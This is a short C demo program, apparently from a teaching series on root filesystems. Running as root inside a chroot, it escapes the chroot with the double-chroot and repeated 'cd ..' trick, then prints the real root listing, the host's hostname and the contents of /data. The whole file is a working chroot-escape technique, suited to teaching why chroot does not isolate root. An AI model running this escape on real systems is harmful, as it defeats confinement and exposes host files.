// 根文件系统：从 chroot 中逃出来
//   escape   在 chroot 之后运行（需要 root）：再做一次 chroot，把当前目录留在新根的外面，
//            然后一直 cd ..，最后 chroot(".")，打印逃出去以后看到的根目录
#include <dirent.h>
#include <sys/stat.h>

#include "common.h"

static void listRoot(const char* title)
{
    printf("%s：/ 下有", title);
    DIR* d = opendir("/");
    struct dirent* e;
    int n = 0;
    while (d && (e = readdir(d)) && n < 12)
        if (e->d_name[0] != '.') printf(" %s", e->d_name), n++;
    if (d) closedir(d);
    printf("\n");
    fflush(stdout);
}

int main(void)
{
    listRoot("逃逸之前");
    mkdir("/.escape", 0700);
    CHECK(chroot("/.escape") == 0);   // 新的根是 /.escape，但当前目录仍然是原来的 /，在新根的外面
    for (int i = 0; i < 64; i++)  // 在根的外面，.. 不会被拦住，一直走到真正的根
        if (chdir("..") != 0) break;
    CHECK(chroot(".") == 0);
    listRoot("逃逸之后");
    execl("/bin/sh", "sh", "-c", "echo 主机名：$(cat /etc/hostname); echo /data 下有：$(ls /data)", (char*)NULL);
    return 1;
}
